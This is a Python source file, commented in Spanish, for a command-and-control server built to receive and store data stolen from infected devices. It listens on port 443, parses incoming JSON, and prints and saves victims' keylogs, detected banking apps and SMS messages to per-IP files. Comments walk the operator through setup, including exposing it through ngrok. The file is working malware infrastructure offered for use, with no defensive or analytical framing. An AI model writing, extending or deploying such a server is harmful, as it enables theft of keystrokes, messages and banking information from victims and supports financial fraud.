# server.py - Servidor C2 que recibe datos robados
import socket
import json
from datetime import datetime
import os
import threading
import pickle
import time

class C2Server:
    def __init__(self, host='0.0.0.0', port=443):
        self.host = host
        self.port = port
        self.clients = {}  # IP -> datos recibidos
        self.lock = threading.Lock()
        
    def handle_client(self, client_socket, address):
        print(f"[*] Cliente conectado: {address}")
        data = b""
        try:
            while True:
                chunk = client_socket.recv(4096)
                if not chunk:
                    break
                data += chunk
                
                # Decodificar JSON
                try:
                    payload = json.loads(data.decode('utf-8'))
                    
                    with self.lock:
                        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                        
                        # GUARDAR DATOS ROBADOS
                        client_id = address[0]  # IP del cliente
                        
                        if 'keylog' in payload:
                            print(f"\n{'='*60}")
                            print(f"🔑 KEYLOG RECIBIDO de {client_id} ({timestamp})")
                            print(f"{'='*60}")
                            for entry in payload['keylog']:
                                print(f"  → {entry}")
                        
                        if 'banking_apps' in payload:
                            print(f"\n🏦 APLICACIONES BANCARIAS DETECTADAS:")
                            for app in payload['banking_apps']:
                                print(f"  → {app}")
                        
                        if 'sms_data' in payload:
                            print(f"\n💬 DATOS SMS RECIBIDOS:")
                            for sms in payload['sms_data']:
                                print(f"  → {sms}")
                        
                        # GUARDAR EN ARCHIVO (puedes cambiar esto)
                        self.save_to_file(payload, client_id, timestamp)
                    
                    data = b""  # Reset para siguiente mensaje
                    
                except json.JSONDecodeError:
                    pass
                
        except Exception as e:
            print(f"[!] Error con cliente {address}: {e}")
        finally:
            client_socket.close()
            with self.lock:
                del self.clients[client_id]

    def save_to_file(self, payload, client_ip, timestamp):
        """Guarda todos los datos robados en archivos"""
        try:
            # Carpeta de almacenamiento
            storage_dir = "C2_STORAGE"
            os.makedirs(storage_dir, exist_ok=True)
            
            # Archivo por cliente
            filename = f"{storage_dir}/client_{client_ip}_{timestamp.replace(':', '_')}.json"
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(payload, f, indent=2, ensure_ascii=False)
            
            print(f"[+] Datos guardados en: {filename}")
        except Exception as e:
            print(f"[!] Error al guardar: {e}")

    def start(self):
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(5)
        
        print(f"\n{'='*60}")
        print(f"🚀 SERVIDOR C2 INICIADO")
        print(f"   IP: {self.host}:{self.port}")
        print(f"   Esperando conexiones...")
        print(f"{'='*60}\n")
        
        while True:
            client_socket, address = server_socket.accept()
            thread = threading.Thread(
                target=self.handle_client, 
                args=(client_socket, address)
            )
            thread.daemon = True
            thread.start()

if __name__ == "__main__":
    # Configura tu IP pública aquí (o usa un servicio como ngrok)
    HOST = "0.0.0.0"  # ← DEJA ESTO ASÍ, NO CAMBIAR A TU IP PÚBLICA
    PORT = 443        # ← PUERTO HTTPS (puedes cambiar a 8080 si prefieres)
    
    server = C2Server(HOST, PORT)
    server.start()
